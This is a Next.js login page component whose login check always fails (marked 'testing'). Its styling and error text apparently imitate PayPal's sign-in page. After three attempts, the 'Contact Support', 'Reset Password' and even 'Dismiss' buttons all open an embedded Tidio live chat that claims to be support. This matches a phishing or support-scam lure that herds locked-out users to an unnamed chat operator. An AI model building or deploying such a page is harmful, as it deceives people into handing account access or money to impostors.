"use client";
import Image from "next/image";
import Script from "next/script";
import React, { useState } from "react";

declare global {
  interface Window {
    tidioChatApi?: {
      show?: () => void;
      open?: () => void;
      messageFromVisitor?: (msg: string) => void;
    };
  }
}

const MAX_ATTEMPTS = 3;

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [showAlert, setShowAlert] = useState(false);
  const [alertTitle, setAlertTitle] = useState("");
  const [alertBody, setAlertBody] = useState<React.ReactNode>(null);
  const [severity, setSeverity] = useState<"error" | "info">("error");

  // ✅ FINAL WORKING FUNCTION
  const openTidioChat = () => {
    if (window.tidioChatApi) {
      // correct method
      if (window.tidioChatApi.show) {
        window.tidioChatApi.show();
      } else if (window.tidioChatApi.open) {
        // fallback
        window.tidioChatApi.open();
      }

      // optional message
      window.tidioChatApi.messageFromVisitor?.(
        "User is facing login issue"
      );
    } else {
      console.log("Tidio not loaded yet");
    }
  };

  async function loginRequest(): Promise<boolean> {
    return false; // testing
  }

  const buildAlert = (nextAttempts: number) => {
    const triesLeft = MAX_ATTEMPTS - nextAttempts;

    if (nextAttempts >= MAX_ATTEMPTS) {
      setSeverity("info");
      setAlertTitle("Having trouble signing in?");
      setAlertBody(
        <>
          <p className="text-sm text-slate-700">
            Don’t worry — we’re here to help you get back in quickly.
          </p>
          <p className="mt-2 text-sm text-slate-500">
            Facing issues with your credentials? Contact our support team instantly.
          </p>
        </>
      );
    } else {
      setSeverity("error");
      setAlertTitle("Some of your information isn’t correct.");
      setAlertBody(
        <>
          <p>Check your email/mobile and password and try again.</p>
          <span className="block mt-1 text-xs text-slate-600">
            {triesLeft} attempt{triesLeft === 1 ? "" : "s"} left.
          </span>
        </>
      );
    }

    setShowAlert(true);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setShowAlert(false);

    const ok = await loginRequest();

    if (ok) {
      setIsSubmitting(false);
      return;
    }

    const next = attempts + 1;
    setAttempts(next);
    buildAlert(next);

    setIsSubmitting(false);
  };

  const alertStyles =
    severity === "error"
      ? "border-red-200 bg-red-50 text-red-800"
      : "border-sky-200 bg-sky-50 text-sky-900";

  return (
    <div className="min-h-screen flex items-center justify-center bg-slate-50 px-4 py-10">

      {/* ✅ ALWAYS LOAD TIDIO */}
      <Script
        src="//code.tidio.co/ozzj418farqwvrgfmddvrd19ip1jleow.js"
        strategy="afterInteractive"
      />

      <div className="w-full max-w-[420px] rounded-2xl bg-white shadow-sm p-8">
        
        {/* Logo */}
        <div className="flex justify-center mb-6">
          <Image src="/logo.png" alt="logo" width={112} height={36} />
        </div>

        {/* Alert */}
        {showAlert && (
          <div className={`${alertStyles} mb-5 rounded-xl border px-4 py-3`}>
            <p className="font-semibold">{alertTitle}</p>
            <div className="mt-2 text-sm">{alertBody}</div>

            <div className="mt-4 flex flex-col gap-2">
              
              {/* ✅ ALL BUTTONS OPEN CHAT */}
              <button
                onClick={openTidioChat}
                className="w-full rounded-full bg-[#0070BA] px-4 py-2 text-sm font-semibold text-white hover:bg-[#005EA6]"
              >
                Contact Support
              </button>

              <button
                onClick={openTidioChat}
                className="w-full rounded-full border border-gray-300 px-4 py-2 text-sm"
              >
                Reset Password
              </button>

              <button
                onClick={() => {
                  openTidioChat();
                  setShowAlert(false);
                }}
                className="text-blue-600 text-sm"
              >
                Dismiss
              </button>
            </div>

            <p className="mt-3 text-xs text-gray-500">
              Our support team usually replies within a few minutes.
            </p>
          </div>
        )}

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email"
            className="w-full h-12 px-4 border rounded-md"
          />

          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            className="w-full h-12 px-4 border rounded-md"
          />

          <button
            type="submit"
            className="w-full h-12 rounded-full bg-[#0070BA] text-white font-semibold"
          >
            Login
          </button>
        </form>
      </div>
    </div>
  );
}